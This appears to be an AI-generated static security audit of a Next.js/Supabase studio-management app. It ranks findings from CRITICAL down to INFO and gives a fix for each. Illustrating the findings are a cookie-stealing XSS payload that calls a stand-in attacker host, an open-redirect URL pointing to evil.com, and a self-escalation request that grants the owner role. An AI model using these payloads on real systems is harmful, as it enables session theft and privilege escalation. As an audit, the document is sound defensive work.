# Layer Report: Security

**Agent:** security
**Completed:** 2026-03-21
**Severity legend:** CRITICAL / HIGH / MEDIUM / LOW / INFO

---

## Executive Summary

**This report is the output of static heuristic analysis. It is not a penetration test or full security audit.** Recommended complementary tools: Semgrep, Snyk (`snyk test`), OWASP ZAP (dynamic scan), and `npm audit`.

Meridian's API layer is architecturally sound: Supabase JWT authentication is enforced per-handler, a `middleware.ts` gate provides centralized redirect protection, Stripe and Resend webhook handlers implement proper HMAC signature verification, and a `requireRole()` helper exists and is used on the most sensitive endpoints (AI, campaigns, payroll, migration). The multi-tenancy model (RLS + explicit `studio_id` filtering) is structurally correct.

However, three critical issues require immediate action before any production deployment: live Supabase service-role and Anthropic API keys are present in `.env.local` (requiring rotation); the OAuth callback accepts an unvalidated `redirect` parameter enabling open redirect attacks; and the `PUT /api/members/[id]` handler is missing a role check, allowing any authenticated user to add the `owner` role to their own profile.

Beyond those, the audit found a cluster of HIGH-severity issues spanning missing security headers on all responses, HTML escaping disabled in the Handlebars email renderer, cryptographically weak code generators (gift cards, A/B test variants), and a rate limiter that resets on every serverless cold start.

---

## Authentication Architecture

**Method:** Supabase Auth (Magic Link / SSO), JWTs stored as HTTP-only session cookies via `@supabase/ssr`.

**Enforcement:** `apps/web/src/middleware.ts` calls `supabase.auth.getUser()` on every request matching the route pattern and redirects unauthenticated users to `/login`. API routes unauthenticated receive a JSON 401. This is the primary protection layer.

**Per-handler checks:** All `~120` route handlers also call `supabase.auth.getUser()` as a second layer. The `requireRole()` helper at `apps/web/src/lib/auth/require-role.ts` combines auth + role check in a single reusable utility — adopted by AI endpoints and some others.

**Role-based authorization:** Not consistent. Campaigns, AI, payroll, migration, QR, and members (GET/DELETE) check roles. Members (PUT), bookings, classes, segments, and geofence check only authentication.

**MFA:** Not available or required. Single-factor Magic Link only.

**Logout / revocation:** `supabase.auth.signOut()` is called from the client-side `AuthContext`. No server-side session invalidation mechanism was found.

---

## Findings

### CRITICAL

**CRIT-01 — Live credentials in `.env.local`**
`apps/web/.env.local` lines 1–6 contain live `SUPABASE_SERVICE_ROLE_KEY` (full RLS bypass), `ANTHROPIC_API_KEY`, and `NEXT_PUBLIC_SUPABASE_PUBLISHABLE_DEFAULT_KEY`. The service-role key can read/write every row in every table without RLS. Both the service-role key and Anthropic key must be rotated immediately. The `.gitignore` excludes `.env*`, so these are not in git history — but they exist on developer machines and could be leaked.

**CRIT-02 — Open redirect in OAuth callback**
`apps/web/src/app/(auth)/auth/callback/route.ts` line 7: `const redirect = searchParams.get("redirect") || "/"` is used without validation at line 14: `return NextResponse.redirect(\`${origin}${redirect}\`)`. A crafted URL `?redirect=//evil.com/path` results in a redirect to `https://app.meridian.studio//evil.com/path` which browsers follow to `evil.com`. Fix: validate that `redirect` starts with `/` and does not start with `//`.

**CRIT-03 — `PUT /api/members/[id]` missing role check — privilege escalation**
`apps/web/src/app/api/members/[id]/route.ts` lines 137–242: the `PUT` handler fetches the caller's profile to resolve `studio_id` but never checks `roles`. The `allowedFields` array at line 167 includes `"roles"`. Any authenticated user can `PUT /api/members/<their-own-id>` with `{"roles": ["owner"]}` to self-escalate. The `GET` and `DELETE` handlers on the same file do check roles (lines 38–43, 268–273). The `PUT` handler must add the same check.

---

### HIGH

**HIGH-01 — No security headers on any response**
`apps/web/next.config.ts` does not configure HTTP security headers. All responses are missing `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, `Referrer-Policy`, and `Permissions-Policy`. Add a `headers()` export to `next.config.ts`.

**HIGH-02 — Handlebars `noEscape: true` — XSS in email rendering**
`apps/web/src/lib/email-templates.ts` line 56: `Handlebars.compile(templateStr, { noEscape: true })`. HTML escaping is disabled. Merge tag values from user-controlled fields (`full_name`, `membership_name`) are injected verbatim into email HTML. A member with name `<img src=x onerror=fetch('//attacker/'+document.cookie)>` would inject into campaign emails sent to all recipients. Remove `{ noEscape: true }`.

**HIGH-03 — Gift card codes use `Math.random()`**
`apps/web/src/app/api/webhooks/stripe/route.ts` lines 204–212: `generateGiftCardCode()` uses `Math.floor(Math.random() * chars.length)`. `Math.random()` is a PRNG, not a CSPRNG. Gift card codes are bearer tokens; predictable codes allow brute-force redemption. Replace with `crypto.randomBytes()`.

**HIGH-04 — A/B test variant assignment uses `Math.random()`**
`apps/web/src/app/api/campaigns/send/route.ts` line 248 and `campaigns/process-scheduled/route.ts` line 237. Non-CSPRNG for variant assignment. Replace with `crypto.randomInt(0, 100)`.

**HIGH-05 — In-memory rate limiter ineffective in serverless**
`apps/web/src/lib/rate-limit.ts`: rate limit state is stored in a module-level `Map`. On Netlify (serverless), each function invocation is a separate process. The 20 req/min AI rate limit and 10 req/min lead capture limit reset on every cold start. Replace with Upstash Redis or equivalent shared store.

**HIGH-06 — Webhook endpoints fail open when secret not configured**
`apps/web/src/app/api/webhooks/easypost/route.ts` lines 49–51 and `webhooks/twilio/route.ts` lines 13–46: if the respective secret environment variable is unset, the request is processed without signature verification. In production, a missing secret should cause a 503 error, not bypass verification.

---

### MEDIUM

**MED-01 — Hardcoded studio UUID in 20+ files**
The literal `"11111111-1111-1111-1111-111111111111"` appears in route handlers including webhook handlers (`webhooks/stripe/route.ts`), AI endpoints, and the `AuthContext`. Stripe webhook events write transactions with this hardcoded `studio_id` rather than resolving from event metadata. Multi-tenancy will silently break.

**MED-02 — Unsubscribe token has no expiry; weak default secret**
`apps/web/src/app/api/unsubscribe/[token]/route.ts` lines 5 and 34–46: the HMAC token includes a `timestamp` field but neither handler checks it against a maximum age. The fallback `UNSUBSCRIBE_SECRET = "meridian-unsubscribe-secret"` is a known plaintext that allows forging tokens if the environment variable is not set.

**MED-03 — Cron GET endpoint mutates state**
`apps/web/src/app/api/cron/waitlist-promote/route.ts` lines 10–12: the `GET` handler delegates to `POST`. A GET that creates bookings violates HTTP semantics and can be triggered by link prefetching or crawlers.

**MED-04 — `NEXT_PUBLIC_` anon key in bundle — documentation gap**
The Supabase anon key correctly uses the `NEXT_PUBLIC_` prefix (browser clients need it). The risk is convention propagation: a developer seeing this pattern may use `NEXT_PUBLIC_` for other secrets. This should be explicitly documented.

**MED-05 — Migration `file_url` not validated for studio ownership**
`apps/web/src/app/api/migration/import/route.ts` lines 100–149: `file_url` comes from the request body and the storage path is extracted by regex. An admin from one studio can provide the `file_url` of another studio's uploaded file. Validate that `storagePath.startsWith(`${studioId}/`)`.

**MED-06 — Search parameter injected into Supabase PostgREST filter string**
`apps/web/src/app/api/members/route.ts` lines 61–63 and `leads/route.ts` lines 80–83: `search` is string-interpolated into `.or()` filter expressions. PostgREST is not SQL, but malformed input can extend the filter clause. Sanitize `search` to remove PostgREST special characters before interpolation.

**MED-07 — Inngest signing key not asserted at startup**
`apps/web/src/app/api/inngest/route.ts`: `serve()` reads `INNGEST_SIGNING_KEY` from the environment but does not assert it is set. If missing, Inngest functions could be invoked with crafted event payloads from any source.

---

### LOW

**LOW-01 — No Zod body validation on API endpoints**
All `POST`/`PUT` handlers use manual field presence checks and type casts (`as { field: type }`). Zod is a declared dependency. Schema validation would prevent type confusion bugs and reduce the attack surface for malformed input.

**LOW-02 — `select("*")` on list endpoints over-fetches PII**
`/api/members` uses `select("*")` returning all profile columns. Explicit field selection reduces data exposure as the schema evolves.

**LOW-03 — Gift card codes stored in plaintext**
`gift_cards.code` is stored as plaintext. If the DB is compromised, all outstanding gift card balances are readable. Consider storing a hash.

**LOW-04 — Lock file not confirmed committed**
All `package.json` dependencies use caret ranges. Without a committed `package-lock.json` and `npm ci` in CI, builds are non-deterministic and can silently pull in vulnerable transitive dependencies.

**LOW-05 — `roles` field writable via general member-update endpoint**
Even after fixing CRIT-03 with a role check, `"roles"` should be removed from `allowedFields` in `PUT /api/members/[id]` and moved to a dedicated, owner-only endpoint with explicit audit logging.

**LOW-06 — Hardcoded `unsubscribe_url` in email defaults**
`apps/web/src/lib/email-templates.ts` line 35 hardcodes `https://thesaunaguys.com/unsubscribe` as the default unsubscribe URL. Emails using this default will not link to the HMAC-based unsubscribe endpoint.

---

### INFO

**INFO-01 — Service-role client bypasses RLS (intended)**
`apps/web/src/lib/inngest/helpers.ts`: the Inngest admin client using the service-role key is correct architecture for background jobs. All queries must filter by `studio_id` explicitly (the comment in the file notes this). Phase 5 RLS policy rewrite is required before client-side access is added.

**INFO-02 — Admin layout has no server-side auth check**
`apps/web/src/app/(admin)/layout.tsx` is `'use client'` and defers auth to `AuthContext`. Protection relies entirely on `middleware.ts`. A server-component layout calling `supabase.auth.getUser()` would provide defense-in-depth.

**INFO-03 — Stripe proration not wired**
`apps/web/src/app/api/members/[id]/upgrade/route.ts` lines 127–131: the actual `stripe.subscriptions.update()` call is not implemented. When wired, ensure idempotency between the upgrade endpoint and the `customer.subscription.updated` webhook.

**INFO-04 — `NEXT_PUBLIC_APP_URL` falls back to production domain**
`apps/web/src/app/api/qr/member/[id]/route.ts` line 87: `process.env.NEXT_PUBLIC_APP_URL ?? "https://app.meridian.studio"`. In development/staging, generated QR codes point to production.

---

## Findings Summary

| Severity | Count | Items |
|----------|-------|-------|
| CRITICAL | 3 | Live credentials in `.env.local`, open redirect in auth callback, missing role check + privilege escalation on `PUT /members/:id` |
| HIGH | 6 | Missing security headers, Handlebars `noEscape`, non-CSPRNG code generation (x2), in-memory rate limiter, webhook fail-open |
| MEDIUM | 7 | Hardcoded studio UUID, unsubscribe token no expiry, cron GET mutation, NEXT_PUBLIC doc gap, migration file_url ownership, search injection, Inngest signing key |
| LOW | 6 | No Zod validation, select star, plaintext gift codes, lock file, roles in allowedFields, hardcoded unsubscribe URL |
| INFO | 4 | Service-role intent, admin layout auth, Stripe proration stub, APP_URL fallback |
